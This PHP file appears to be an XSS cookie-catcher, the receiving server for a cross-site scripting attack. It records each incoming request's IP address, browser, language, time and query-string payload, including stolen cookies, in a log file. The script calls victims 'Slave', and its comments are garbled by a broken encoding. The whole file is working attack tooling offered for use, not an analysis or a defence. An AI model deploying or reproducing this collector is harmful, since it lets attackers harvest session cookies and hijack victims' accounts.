<?php

$fvck="Slave login at: ";

$border = "\r\n+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++\r\n";

$slaveip = "Slave IP: ".getenv('REMOTE_ADDR');   //��ȡIP
$slaveagent = "Slave User-Agent: ".getenv('HTTP_USER_AGENT');  // �������ϵͳ�汾
$slavelang = "Slave Lang: ".getenv('HTTP_ACCEPT_LANGUAGE');  // ����
$requestdate = date("m/d/Y H:i:s", $_SERVER['REQUEST_TIME']); //����ʱ��
//$requestdate = date(DATE_RFC822);

$qstr = getenv('QUERY_STRING');  // XSS���ص�����
//$qstr = base64_decode($qstr); // ����base64
//$qstr = urldecode($qstr);
$qstr = "XSS got: \r\n     ".urldecode($qstr);


//����Cookie
$slavecookie = strchr($qstr, "    [**** Cookie");
$slavecookiepos = strpos($qstr, "    [**** Cookie");

// ����XSS��Դ
$slaveuri = substr($qstr, 0, $slavecookiepos);



// д��־
$fp = fopen("logxss.log","a");


//fwrite($fp,"$border\r\n $fvck $requestdate\r\n $slaveip\r\n $slaveagent\r\n $slavelang\r\n $slaveuri\r\n $slavecookie\r\n$border");
fwrite($fp,"$border\r\n $fvck $requestdate\r\n $slaveip\r\n $slaveagent\r\n $slavelang\r\n $qstr\r\n$border");

fclose($fp);

?>